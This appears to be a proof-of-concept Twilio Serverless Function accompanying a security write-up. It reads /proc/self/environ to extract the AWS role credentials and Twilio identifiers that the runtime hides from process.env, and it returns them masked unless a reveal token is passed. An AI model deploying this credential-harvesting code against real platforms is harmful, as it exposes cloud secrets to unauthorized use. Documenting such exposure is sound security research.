/**
 * Twilio Serverless Function: read the execution role's credentials out of
 * /proc/self/environ, and hand them back in the shape the write-up documents.
 *
 * `process.env` is not where the interesting values live on this runtime — the
 * runtime's require-hooking strips some of them from the ordinary environment.
 * /proc/self/environ is the kernel's copy of what the process was started with,
 * and nothing in the JavaScript layer rewrites it.
 *
 * The response is masked by default. The real values are returned only when the
 * caller passes the REVEAL_TOKEN you set in .env, so a function you forget to
 * delete is not a public credential dump.
 */
const fs = require("fs");

const ENV_PATH = "/proc/self/environ";

function parseEnviron(raw) {
  const env = {};
  raw
    .split("\0")
    .filter(Boolean)
    .forEach(function (entry) {
      const i = entry.indexOf("=");
      if (i > 0) env[entry.slice(0, i)] = entry.slice(i + 1);
    });
  return env;
}

function cut(value, keep) {
  if (!value) return null;
  return value.length > keep ? value.slice(0, keep) + "…" : value;
}

exports.handler = function (context, event, callback) {
  let env = {};
  let readError = null;
  try {
    env = parseEnviron(fs.readFileSync(ENV_PATH, "utf8"));
  } catch (e) {
    readError = e.message;
  }

  const key = env.AWS_ACCESS_KEY_ID;
  const secret = env.AWS_SECRET_ACCESS_KEY;
  const session = env.AWS_SESSION_TOKEN;

  const token = process.env.REVEAL_TOKEN;
  const revealed = !!token && !!event && event.token === token;

  const out = {
    read_error: readError,
    aws_access_key_id: revealed ? key || null : cut(key, 8),
    aws_secret_access_key: revealed ? secret || null : "masked",
    aws_session_token: revealed ? session || null : session ? "present (" + session.length + " chars)" : null,
    aws_region: env.AWS_REGION || null,
    aws_function_name: revealed ? env.AWS_LAMBDA_FUNCTION_NAME || null : cut(env.AWS_LAMBDA_FUNCTION_NAME, 9),
    aws_log_group: revealed
      ? env.AWS_LAMBDA_LOG_GROUP_NAME || null
      : cut(env.AWS_LAMBDA_LOG_GROUP_NAME, 22),
    aws_runtime_api: env.AWS_LAMBDA_RUNTIME_API || null,
    parent_token_present: !!context.PARENT_TOKEN,
    auth_token_present: !!context.AUTH_TOKEN,
    account_sid: revealed ? context.ACCOUNT_SID || null : cut(context.ACCOUNT_SID, 8),
    service_sid: revealed ? context.SERVICE_SID || null : cut(context.SERVICE_SID, 8),
    environment_sid: revealed ? context.ENVIRONMENT_SID || null : cut(context.ENVIRONMENT_SID, 8),
    domain: context.DOMAIN_NAME || null,
  };

  return callback(null, out);
};
